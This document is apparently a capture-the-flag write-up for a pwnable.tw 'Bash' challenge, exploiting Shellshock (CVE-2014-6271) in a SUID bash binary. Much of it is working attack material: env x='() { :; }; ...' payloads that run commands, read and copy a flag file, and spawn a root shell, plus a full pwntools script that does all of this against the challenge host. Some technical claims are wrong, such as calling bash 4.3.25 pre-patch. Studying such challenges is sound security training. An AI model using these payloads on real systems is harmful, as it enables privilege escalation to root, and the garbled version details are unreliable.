2. Static Analysis

Bash Version Analysis

Bash version 4.3.25 was released before the Shellshock patch. The Shellshock vulnerability (CVE-2014-6271) was publicly disclosed on September 24, 2014. It affects bash versions up to and including 4.3, where the function definition parsing in environment variables allows arbitrary command execution.

bash — bash version check
$ /home/bash/bash --version
GNU bash, version 4.3.25(1)-release (x86_64-pc-linux-gnu)

# This version is VULNERABLE to Shellshock (patched in 4.3.25(8))

CVE Research: Shellshock (CVE-2014-6271)

Shellshock is a family of security bugs in bash that allow attackers to execute arbitrary commands via specially crafted environment variables. The vulnerability exists because bash continues to execute trailing commands after a function definition in an environment variable:

bash — Shellshock mechanism
# The vulnerability: bash parses function definitions from environment
# variables but also executes any trailing commands after the function body

# Vulnerable pattern:
env x='() { :; }; VULNERABLE_COMMAND' bash -c 'echo test'

# What happens:
# 1. bash sees 'x' as a function definition: x() { :; }
# 2. bash ALSO executes the trailing: VULNERABLE_COMMAND
# This happens BEFORE any user script runs!

# The classic test:
env x='() { :; }; echo VULNERABLE' bash -c 'echo test'
# Output: VULNERABLE
#         test
# The "VULNERABLE" is printed because bash executes the trailing command
Why SUID + Shellshock = Root

When a SUID bash binary is executed, it runs with the effective UID of the file owner (root). The Shellshock vulnerability allows us to inject commands via environment variables that execute before bash drops privileges. Even though modern bash drops SUID privileges on startup, the vulnerable version 4.3.25 processes the environment variable function definitions before dropping privileges, allowing the injected command to run as root.

4. Exploit Strategy

Attack Overview

Step 1: Connect & Enumerate
Connect to nc chall.pwnable.tw 10108 and get a low-privilege shell. Find the SUID bash binary at /home/bash/bash. Check the bash version (4.3.25, pre-Shellshock patch).
Step 2: Verify Shellshock
Test the Shellshock vulnerability using the classic env x='() { :; }; id' pattern. Confirm that euid=0(root) is returned, proving the SUID bash executes injected commands with root privileges.
Step 3: Read the Flag
Use the Shellshock exploit to read the flag file with root privileges: env x='() { :; }; cat /home/flag/flag' /home/bash/bash -c 'echo done'. Alternatively, spawn a root shell and read the flag interactively.

Shellshock Exploitation Details

The Shellshock vulnerability exploits bash's function export mechanism. When bash starts, it imports function definitions from environment variables. The parsing code doesn't properly validate that the function definition ends at the closing brace, so any commands after ; } are also executed.

shellshock anatomy
# Shellshock payload anatomy:
# env VAR='() { :; }; INJECTED_COMMAND' /path/to/suid/bash -c 'anything'
#
# Breakdown:
#   env VAR='...'   → Set environment variable VAR
#   () { :; }       → Function definition (does nothing)
#   ;                → End of function body
#   INJECTED_COMMAND → THIS RUNS AS ROOT (via SUID)!!
#   bash -c '...'    → Normal bash invocation
#
# The function definition parser in bash 4.3.25 doesn't stop
# at the closing brace — it continues executing after the ';'
# This means INJECTED_COMMAND runs with euid=0 (root)!

# Multiple exploitation paths:
# 1. Direct command execution:
env x='() { :; }; cat /home/flag/flag' /home/bash/bash -c ''

# 2. Spawn root shell:
env x='() { :; }; /bin/sh' /home/bash/bash -c ''

# 3. Copy flag to readable location:
env x='() { :; }; cp /home/flag/flag /tmp/flag; chmod 777 /tmp/flag' /home/bash/bash -c ''
Bash Privilege Dropping

Modern bash versions (post-Shellshock patches) drop SUID privileges early in initialization. Even in vulnerable versions, bash may drop euid back to the real UID after processing startup files. The key is that the Shellshock command injection happens during environment variable processing, which occurs before privilege dropping. This is why the env x='() { :; }; command' technique works with SUID bash.

5. Pwn Script

Full Exploit

python
#!/usr/bin/env python3
"""
pwnable.tw — Bash (200 pts)
Privilege escalation via Shellshock (CVE-2014-6271) on SUID bash.

The challenge gives us a shell and a SUID bash binary vulnerable
to Shellshock. We exploit the environment variable function
definition parsing bug to execute commands as root.
"""

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10108

r = remote(HOST, PORT)

# Wait for shell prompt
r.recvuntil(b'$ ')

# Step 1: Verify Shellshock vulnerability on SUID bash
log.info("Testing Shellshock on SUID bash...")
r.sendline(b"env x='() { :; }; id' /home/bash/bash -c 'echo done'")
result = r.recvline()
if b'euid=0' in result:
    log.success("Shellshock confirmed! euid=0 (root)")
else:
    log.error("Shellshock not working, trying alternative...")

# Step 2: Read the flag using Shellshock
log.info("Reading flag via Shellshock...")
r.sendline(b"env x='() { :; }; cat /home/flag/flag' /home/bash/bash -c ''")
flag = r.recvline().strip()
log.success(f"Flag: {flag.decode()}")

# Step 3: Get interactive root shell (optional)
log.info("Spawning interactive root shell...")
r.sendline(b"env x='() { :; }; /bin/sh' /home/bash/bash -c ''")
r.sendline(b'id')
r.interactive()

The Bash challenge demonstrates a real-world vulnerability (Shellshock/CVE-2014-6271) that affected millions of systems when it was disclosed in 2014. The combination of a SUID bash binary and a pre-patch bash version makes exploitation trivial. This is a classic example of privilege escalation through a known vulnerability in a setuid binary.

Historical Context

Shellshock (CVE-2014-6271) was disclosed on September 24, 2014, and was rated CVSS 10.0 (maximum severity). It affected bash versions dating back to 1989, making it one of the longest-standing vulnerabilities in a widely-used piece of software. The bug allowed remote code execution on many web servers (via CGI), DHCP clients, SSH servers with forced commands, and any system where user-controlled data could be placed in environment variables passed to bash. The SUID bash pattern exploited in this challenge was one of the most dangerous attack vectors, as it allowed local privilege escalation to root on any system with a SUID bash.

Related Challenges

Pwnable.tw also has a harder variant called "Bash Revenge" (500 pts) which involves a different (post-initial-patch) bash vulnerability. The initial Shellshock patch was incomplete, leading to CVE-2014-6278 and other follow-up vulnerabilities that required additional patches to fully address the function definition parsing issue.
